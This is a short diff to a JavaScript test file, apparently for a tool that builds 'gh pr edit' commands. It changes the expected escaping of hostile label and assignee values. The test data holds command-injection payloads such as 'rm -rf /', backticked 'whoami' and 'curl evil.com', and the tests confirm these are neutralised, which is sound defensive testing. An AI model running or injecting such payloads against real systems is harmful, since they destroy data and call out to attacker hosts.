@@ -460,7 +460,7 @@ Step 3: Third thing`;
       });
 
       // Verify escaping is applied
-      expect(result).toContain('bug\\"; rm -rf /,feature\\$VAR,test\\`whoami\\`');
+      expect(result).toContain('bug\\"\\; rm -rf /,feature\\$VAR,test\\`whoami\\`');
       // Verify unescaped metacharacters are not present
       expect(result).not.toMatch(/gh pr edit --add-label "bug"; rm/);
       expect(result).not.toMatch(/feature\$VAR/);
@@ -475,7 +475,7 @@ Step 3: Third thing`;
       });
 
       // Verify escaping is applied
-      expect(result).toContain('user\\"; curl evil.com; echo \\"');
+      expect(result).toContain('user\\"\\; curl evil.com\\; echo \\"');
       // Verify the command injection is prevented
       expect(result).not.toMatch(/gh pr edit --add-assignee "user"; curl/);
     });
